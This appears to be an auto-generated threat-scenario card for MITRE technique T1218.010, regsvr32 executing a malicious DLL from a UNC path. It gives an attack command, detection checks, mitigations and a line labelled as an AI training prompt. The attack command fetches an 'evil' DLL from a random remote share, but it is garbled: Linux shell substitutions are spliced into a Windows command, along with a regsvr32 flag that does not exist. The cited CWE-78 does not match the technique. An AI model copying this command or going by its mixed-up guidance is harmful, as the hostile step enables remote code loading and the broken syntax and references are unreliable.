---
type: campaign
scenario_id: 311
tactic: Defense Evasion
technique: "T1218.010: Regsvr32"
technique_id: T1218.010
tags: [campaign, lotl, defense_evasion]
---

# Using regsvr32 to execute malicious DLL via UNC path.

## Threat Description
Using regsvr32 to execute malicious DLL via UNC path.

## Attack Command
```
regsvr32 /s /u \\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor regsvr32 UNC: `wmic process where name='regsvr32.exe' get commandline | findstr \\`; YARA rule: `rule Regsvr32UncDll { strings: $a = /regsvr32.*\\/ nocase; condition: $a }`.

## Mitigation
Restrict regsvr32: `icacls %windir%\System32\regsvr32.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.

## AI Training Prompt
Train AI to detect regsvr32 UNC DLL execution and suggest SMB restrictions.

## References
- MITRE ATT&CK T1218.010: https://attack.mitre.org/techniques/T1218/010/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
